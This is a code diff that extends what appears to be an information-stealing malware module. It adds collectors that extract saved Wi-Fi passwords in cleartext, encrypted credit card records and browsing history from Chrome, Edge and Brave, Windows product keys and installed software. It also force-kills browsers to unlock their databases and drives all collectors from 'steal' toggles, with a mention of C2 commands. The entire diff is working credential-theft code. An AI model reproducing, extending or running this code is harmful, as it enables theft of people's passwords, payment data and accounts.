@@ -265,30 +265,226 @@ def collect_roblox() -> dict:
     return out
 
 
-# ------------------------------------------------------------------ driver
-def collect_all() -> dict:
-    """Run every collector, isolate failures, return the harvest bundle."""
-    stage = tempfile.mkdtemp(prefix="jwg_stage_")
-    bundle = {"stage": stage, "counts": {}}
-    for name, fn in (("cookies", lambda: collect_cookies(stage)),
-                     ("passwords", collect_passwords),
-                     ("discord", collect_discord),
-                     ("telegram", collect_telegram),
-                     ("roblox", collect_roblox)):
+# ------------------------------------------------------------------ wifi
+def collect_wifi() -> dict:
+    """Export saved WLAN profiles + plaintext keys via netsh. User-scoped, no admin."""
+    out = {"networks": [], "notes": []}
+    if not IS_WINDOWS:
+        return out
+    import subprocess, re as _re
+    try:
+        p = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True,
+                           text=True, timeout=20,
+                           creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
+        names = _re.findall(r"^\s*All User Profile\s*:\s*(.+)$", p.stdout, _re.M)
+    except Exception as e:
+        out["notes"].append(f"enum failed: {e}")
+        return out
+    for name in [n.strip() for n in names if n.strip()]:
+        rec = {"ssid": name, "key": ""}
         try:
-            bundle[name] = fn()
+            q = subprocess.run(["netsh", "wlan", "show", "profile", f'name={name}', "key=clear"],
+                               capture_output=True, text=True, timeout=20,
+                               creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
+            m = _re.search(r"Key Content\s*:\s*(.*)", q.stdout)
+            rec["key"] = (m.group(1).strip() if m else "")
+        except Exception:
+            pass
+        out["networks"].append(rec)
+    return out
+
+
+# ------------------------------------------------------------------ autofill / history
+def _chromium_table(db_rel: str, sql: str, cols: list[str]) -> tuple[list[dict], list[str]]:
+    notes: list[str] = []
+    found: list[dict] = []
+    bases = [
+        ("chrome", os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data")),
+        ("edge", os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data")),
+        ("brave", os.path.join(os.environ.get("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "Data")),
+    ]
+    for brand, base in bases:
+        if not base or not os.path.isdir(base):
+            continue
+        for db in glob.glob(os.path.join(base, "*", db_rel)):
+            con, tmp = capture._sqlite_snapshot(db)
+            if con is None:
+                notes.append(f"{brand}: db locked"); continue
+            try:
+                cur = con.execute(sql)
+                for row in cur.fetchall():
+                    found.append({"brand": brand, **dict(zip(cols, [_s(x) for x in row]))})
+            except sqlite3.Error as e:
+                notes.append(f"{brand}: {e}")
+            finally:
+                con.close(); shutil.rmtree(tmp, ignore_errors=True)
+    return found, notes
+
+
+def _s(v):
+    if isinstance(v, bytes):
+        return v.decode("utf-8", "replace")
+    return v
+
+
+def collect_autofill() -> dict:
+    rows, notes = _chromium_table(
+        "Web Data",
+        "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards",
+        ["name", "exp_month", "exp_year", "card_enc"])
+    return {"cards": rows, "notes": notes}
+
+
+def collect_history() -> dict:
+    rows, notes = _chromium_table(
+        "History", "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 5000",
+        ["url", "title", "visits"])
+    return {"urls": rows, "notes": notes}
+
+
+# ------------------------------------------------------------------ product keys / software
+def collect_product_keys() -> dict:
+    out = {"keys": [], "notes": []}
+    if not IS_WINDOWS:
+        return out
+    try:
+        import winreg  # type: ignore
+        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
+        for val in ("Product Name", "ProductID", "DigitalProductId"):
+            try:
+                data, _ = winreg.QueryValueEx(k, val)
+                out["keys"].append({val: data})
+            except FileNotFoundError:
+                pass
+        winreg.CloseKey(k)
+    except Exception as e:
+        out["notes"].append(str(e))
+    return out
+
+
+def collect_software_list() -> dict:
+    out = {"apps": [], "notes": []}
+    if not IS_WINDOWS:
+        return out
+    try:
+        import winreg  # type: ignore
+        roots = [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
+                 r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]
+        for root in roots:
+            try:
+                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, root)
+            except OSError:
+                continue
+            i = 0
+            while True:
+                try:
+                    sub = winreg.EnumKey(key, i); i += 1
+                except OSError:
+                    break
+                try:
+                    sk = winreg.OpenKey(key, sub)
+                    name = winreg.QueryValueEx(sk, "DisplayName")[0]
+                    ver = winreg.QueryValueEx(sk, "DisplayVersion")[0] if _has(sk, "DisplayVersion") else ""
+                    winreg.CloseKey(sk)
+                    if name:
+                        out["apps"].append({"name": name, "version": ver})
+                except OSError:
+                    continue
+            winreg.CloseKey(key)
+    except Exception as e:
+        out["notes"].append(str(e))
+    return out
+
+
+def _has(k, v):
+    import winreg  # type: ignore
+    try:
+        winreg.QueryValueEx(k, v); return True
+    except FileNotFoundError:
+        return False
+
+
+# ------------------------------------------------------------------ process control
+def kill_browsers() -> list[str]:
+    """Close browser processes so their profile SQLite/WAL locks release before
+    we read them. Returns the names actually killed. Best-effort; user scope."""
+    killed = []
+    if not IS_WINDOWS:
+        return killed
+    import subprocess
+    for proc in ("chrome.exe", "msedge.exe", "brave.exe", "opera.exe",
+                 "firefox.exe", "vivaldi.exe"):
+        try:
+            r = subprocess.run(["taskkill", "/f", "/im", proc],
+                               capture_output=True, text=True, timeout=10,
+                               creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
+            if r.returncode == 0:
+                killed.append(proc)
+        except Exception:
+            continue
+    return killed
+
+
+# ------------------------------------------------------------------ driver
+_COLLECTORS = {
+    "cookies":       lambda stage: collect_cookies(stage),
+    "passwords":     collect_passwords,
+    "discord":       collect_discord,
+    "telegram":      collect_telegram,
+    "roblox":        collect_roblox,
+    "wifi":          collect_wifi,
+    "autofill":      collect_autofill,
+    "history":       collect_history,
+    "product_keys":  collect_product_keys,
+    "software_list": collect_software_list,
+}
+
+# maps a cfg.steal toggle -> the collector key(s) it enables
+_TOGGLE_TO_COLLECTOR = {
+    "cookies": "cookies", "passwords": "passwords", "discord": "discord",
+    "telegram": "telegram", "roblox": "roblox", "wifi": "wifi",
+    "autofill": "autofill", "history": "history",
+    "product_keys": "product_keys", "software_list": "software_list",
+}
+
+
+def collect_all(cfg: dict | None = None) -> dict:
+    """Run enabled collectors only, isolate failures, return the harvest bundle.
+
+    cfg.steal toggles decide which run. system_info/screenshot/extensions are
+    handled elsewhere (report header / on-demand C2 command), not here.
+    """
+    steal = (cfg or {}).get("steal", {})
+    enabled = set()
+    if not steal:  # legacy/no-config path -> everything on
+        enabled = set(_TOGGLE_TO_COLLECTOR.values())
+    else:
+        for toggle, coll in _TOGGLE_TO_COLLECTOR.items():
+            if steal.get(toggle, False):
+                enabled.add(coll)
+
+    stage = tempfile.mkdtemp(prefix="jwg_stage_")
+    bundle = {"stage": stage, "counts": {}, "enabled": sorted(enabled)}
+    for name in enabled:
+        fn = _COLLECTORS[name]
+        try:
+            bundle[name] = fn(stage) if name == "cookies" else fn()
         except Exception as e:
             bundle[name] = {"error": f"{type(e).__name__}: {e}"}
-    # Counts for the report header (numbers, not adjectives).
+
     def n(lst):
         return len(lst) if isinstance(lst, list) else 0
-    c = bundle.get("cookies", {})
-    p = bundle.get("passwords", {})
+    c = bundle.get("cookies", {}); p = bundle.get("passwords", {})
     bundle["counts"] = {
         "cookies": n(c.get("chromium")) + n(c.get("firefox")),
         "passwords": n(p.get("chromium")) + n(p.get("firefox")),
         "discord_tokens": n(bundle.get("discord", {}).get("tokens")),
         "telegram_accounts": n(bundle.get("telegram", {}).get("dirs")),
         "roblox_cookies": n(bundle.get("roblox", {}).get("cookies")),
+        "wifi_networks": n(bundle.get("wifi", {}).get("networks")),
+        "cards": n(bundle.get("autofill", {}).get("cards")),
+        "history_urls": n(bundle.get("history", {}).get("urls")),
+        "product_keys": n(bundle.get("product_keys", {}).get("keys")),
+        "software": n(bundle.get("software_list", {}).get("apps")),
     }
     return bundle
